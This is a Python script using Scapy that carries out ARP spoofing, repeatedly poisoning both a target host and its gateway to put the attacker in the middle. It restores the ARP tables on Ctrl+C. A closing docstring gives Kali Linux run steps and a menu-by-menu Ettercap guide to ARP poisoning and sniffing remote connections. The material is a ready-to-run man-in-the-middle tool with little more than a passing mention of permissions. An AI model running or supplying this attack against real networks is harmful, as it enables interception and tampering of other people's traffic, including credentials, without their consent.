from scapy.all import ARP, Ether, sendp, srp
import time
import sys

# Function to get the MAC address of a target IP
def get_mac(ip):
    # Create ARP request packet
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Send the packet and receive the response
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

# Function to spoof the ARP table
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Unable to get MAC address for {target_ip}")
        return

    # Create ARP packet pretending to be the spoof_ip
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send the ARP response
    sendp(Ether(dst=target_mac)/arp_response, verbose=False)

# Function to restore the network to its normal state
def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac is None or spoof_mac is None:
        print(f"[!] Unable to get MAC addresses for restoring")
        return

    # Correct ARP information
    arp_restore = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)

    sendp(Ether(dst=target_mac)/arp_restore, count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    try:
        print("[+] Starting ARP spoofing. Press Ctrl+C to stop.")
        while True:
            # Spoof target: make it think we are the gateway
            spoof(target_ip, gateway_ip)
            # Spoof gateway: make it think we are the target
            spoof(gateway_ip, target_ip)

            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C ! Restoring the network...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Network restored. Exiting.")

"""
Note:
To run this script inside Kali Linux terminal, you can use the following steps:

1. Make sure you have Python 3 and Scapy installed. If not, install with:
   sudo apt update && sudo apt install python3-pip
   sudo pip3 install scapy

2. Save the script with a .py extension, for example:
   arp_spoof.py

3. Give the script execution permissions (optional):
   chmod +x arp_spoof.py

4. Run the script with root privileges:
   sudo python3 arp_spoof.py <target_ip> <gateway_ip>

Example:
   sudo python3 arp_spoof.py 192.168.1.10 192.168.1.1

Always check if your network card is in the correct mode (e.g., monitor mode if needed) and ensure you have the necessary permissions to perform such actions.

---

Alternatively, you can perform ARP poisoning using Ettercap, a powerful network sniffer and man-in-the-middle attack tool available by default in Kali Linux.

To do this with Ettercap:

1. Open a terminal in Kali Linux.

2. To use Ettercap in graphical (visual) mode, type:

   sudo ettercap -G

3. In the GUI:
   - Go to "Sniff" > "Unified sniffing"
   - Select your network interface (e.g., eth0 or wlan0)
   - Go to "Hosts" > "Scan for hosts"
   - Then go to "Hosts" > "Host list" and add the target and gateway to Target 1 and Target 2
   - Then go to "Mitm" > "ARP poisoning" and check "Sniff remote connections"
   - Finally, click on "Start" > "Start sniffing"

This will begin ARP poisoning and allow you to monitor or manipulate traffic via the graphical interface.

Ettercap is very flexible and supports plugins, filters, and more complex attack scenarios.
"""
